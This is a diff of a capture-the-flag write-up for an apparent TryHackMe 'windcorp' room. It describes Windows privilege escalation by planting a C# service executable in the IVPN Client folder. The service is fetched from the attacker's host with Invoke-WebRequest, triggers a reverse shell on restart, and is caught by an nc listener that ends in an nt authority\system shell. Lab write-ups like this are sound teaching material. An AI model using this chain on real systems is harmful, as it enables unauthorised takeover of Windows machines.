@@ -1665,8 +1665,9 @@ Execute the script:
 	dir "C:\Program Files\IVPN Client" | findstr log001.txt
  	-a----          7/9/2024  12:41 AM             18 log001.txt                                                           
 
-Ok so we have all the requirements in order to perform our exploit. We only need to code a windows service that on start will execute a reverse shell. We can use malvasiaC reverse shell since it is already on the system. I created a simple C# windows service project using .Net 4.8 since as we saw it is installed on the server. You can find the source code [here (https://github.com/zinzloun/THM_WriteUP/blob/main/windcorp/WindowsService1.7z). The rilevant part is in Service1.cs:
+It is not clear to me what is the mechanism that run that action under the cover. I think that the once the event is logged an action is triggered to copy, the contents of temp directory to the IVPN client folder. Technically I don't know how it is done, so if any of you, esteemed readers, have any ideas, please let me know.
 
+Ok so we have all the requirements in order to perform our exploit. We only need to code a windows service that on start will execute a reverse shell. We can use malvasiaC reverse shell, since it is already deployed on the system. I created a simple C# windows service project using .Net 4.8 on VSC 2022, since as we saw this is the .Net framework installed on the server. You can find the source code [here](https://github.com/zinzloun/THM_WriteUP/blob/main/windcorp/WindowsService1.7z). The rilevant part is in Service1.cs, OnStart event:
 	
         protected override void OnStart(string[] args)
         {
@@ -1688,7 +1689,7 @@ Ok so we have all the requirements in order to perform our exploit. We only need
             
         }
 
-The service on the start event will execute our reverse shell, before it will sleep 10 seconds, this to permit us, once restarted IVPN service, to cloes the current nc listener and to start it again, otherwise since the port would be occupied by the current session, the exploit wont work. Eventually you can configure the service name in ProjectInstaller.Designer.cs
+The service startign will execute our reverse shell, before it will sleep 10 seconds, this to permit us, once restarted IVPN service, to cloes the current nc listener and to start it again, otherwise since the port would be occupied by the current session, the exploit wont work. Eventually you can configure the service name in ProjectInstaller.Designer.cs
 
 	...
  	 private void InitializeComponent()
@@ -1711,19 +1712,16 @@ The service on the start event will execute our reverse shell, before it will sl
 I also specified that the service must run as local system user. Once compiled we have to rename the exe as IVPN and transfered to C:\temp on Osirid
 
 	PS C:\script> Invoke-WebRequest http://10.9.0.223:8000/IVPN.exe -outfile c:\temp\IVPN.exe
+Then trigger the update script to transfer the exe to the IVPN client folder:
 
-
- 	PS C:\script> cscript update.vbs
+	PS C:\script> cscript update.vbs
 	cscript update.vbs
 	Microsoft (R) Windows Script Host Version 5.812
 	Copyright (C) Microsoft Corporation. All rights reserved.
-
 	
- 	dir "C:\Program Files\IVPN Client"
+    	dir "C:\Program Files\IVPN Client"
 
-
-    Directory: C:\Program Files\IVPN Client
-
+    	Directory: C:\Program Files\IVPN Client
 
 	Mode                 LastWriteTime         Length Name                                                                 
 	----                 -------------         ------ ----                                                                 
@@ -1731,19 +1729,26 @@ I also specified that the service must run as local system user. Once compiled w
 	-a----          7/9/2024  12:14 AM           6656 IVPN.exe         
  	....
 
-  The IVPN Client service is starting....^C
+Now we need to restart the service, and once we get the message, hit CTRL+C to kill the session
+
+ 	 PS C:\script> net stop "IVPN Client"; net start "IVPN Client"
+    	The IVPN Client service is stopping.
+    	The IVPN Client service was stopped successfully.
+	
+ 	The IVPN Client service is starting....^C
                                                                                                                                                      
+Then within 10 seconds restart the listener and you should get a shell as system:
 
-└─$ nc -lvp 1234
-listening on [any] 1234 ...
-10.10.53.226: inverse host lookup failed: Unknown host
-connect to [10.9.0.223] from (UNKNOWN) [10.10.53.226] 50177
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
-
-Try the new cross-platform PowerShell https://aka.ms/pscore6
-
-PS C:\Windows\system32> whoami
-whoami
-nt authority\system
-
+	└─$ nc -lvp 1234
+	listening on [any] 1234 ...
+	10.10.53.226: inverse host lookup failed: Unknown host
+	connect to [10.9.0.223] from (UNKNOWN) [10.10.53.226] 50177
+	Windows PowerShell
+	Copyright (C) Microsoft Corporation. All rights reserved.
+	
+	Try the new cross-platform PowerShell https://aka.ms/pscore6
+	
+	PS C:\Windows\system32> whoami
+	whoami
+	nt authority\system
+	
